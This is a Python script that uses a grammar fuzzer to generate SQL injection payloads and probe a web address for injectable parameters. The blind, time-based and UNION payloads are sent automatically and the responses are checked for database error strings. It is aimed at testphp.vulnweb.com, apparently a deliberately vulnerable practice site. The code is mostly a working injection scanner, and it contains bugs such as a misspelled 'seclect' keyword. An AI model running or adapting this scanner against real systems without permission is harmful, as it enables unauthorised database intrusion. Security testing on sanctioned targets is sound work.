
import fuzzingbook
from fuzzingbook.Grammars import *
import sys
import urllib
import urllib.request as urllib1

error_msg = ["You have an error in your SQL syntax", "Warning: mysql_fetch_array()", "sql test"]

def generator(GRAMMAR):
    return set([simple_grammar_fuzzer(GRAMMAR) for i in range(50)])




def generator_blind_sql():
    SQLI_blind_GRAMMAR = {
    "<start>" : ["<sqli-payload>"],
    "<sqli-payload>" : ["<quote> <condition> <aftercondition><comment>"],
    "<condition>" : ["and", "or"],
    "<aftercondition>" : ["1=1", "1=0",  "dbms_pipe.receive_message(('a'),10)", "WAITFOR DELAY '0:0:10'" , "SELECT pg_sleep(10)", "SELECT sleep(10)"],
    "<quote>" : ["'", "\""],
    "<comment>" : ["-- ", "#", 	"/* "]
    }
    return generator(SQLI_blind_GRAMMAR)


def generator_union_sql():
    sql_union = "<quote> <union> <select> "
    a = ["\"sql test\""]
    payloads = set()
    for i in range(0,9):
        if "<something>" in sql_union:
            sql_union = sql_union + ",<something>"
        else:
            sql_union = sql_union + "<something>"


        SQLI_union_GRAMMAR = {
            "<start>" : ["<sqli-payload>"],
            "<sqli-payload>" : [ sql_union+"<comment>"],
            "<condition>" : ["and", "or"],
            "<aftercondition>" : ["1=1", "1=0"],
            "<quote>" : ["'"],
            "<union>" : ["union"],
            "<select>" : [ "seclect"],
            "<something>" : a,
            "<comment>" : ["--", "#", ""]
            }
        payloads.update([simple_grammar_fuzzer(SQLI_union_GRAMMAR) for i in range(50)])
    return payloads


def simple_scan(payloads):
    fullurl = input("Url: ")
    errormsg = ["You have an error in your SQL syntax", "Warning: mysql_fetch_array()", "sql test"]
    errorr = "yes"
    end = "no"

    for payload in payloads:
        resp = urllib1.urlopen(fullurl + urllib.parse.quote_plus(payload))
        body = resp.read()
        fullbody = body.decode('utf-8')

        for error in errormsg:
            if error in fullbody:
                if errorr == "no":
                    print ("[-] That payload might not work!")
                    errorr = "yes"
                else:
                    print ("[+] The website is SQL injection vulnerable! Payload: " + payload + "\r\n")
                    print ("                                                      " + fullurl+payload)
                    print ("------------------------------------------------------------------------------\r\n")
                    end = "yes"
            
        if end == "yes":
            break                   

def check_page_with_payload(url, payload, type_check):
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    driver = webdriver.PhantomJS()
    driver.get(url+ urllib.parse.quote_plus(payload))
    for i in error_msg:
        if i in driver.page_source:
            return True


def union_check(url):
    payloads = generator_union_sql()
    print(payloads)
    for payload in payloads:
        check = check_page_with_payload(url, payload, union_check)
        if check == True:
            print ("[+] The website is SQL injection vulnerable! Payload: " + payload + "\r\n")
            print ("                                                      " + url+payload)
            print ("------------------------------------------------------------------------------\r\n")
            break


def main(url):
    
    union_check(url)

    
main("http://testphp.vulnweb.com/search.php?test=")
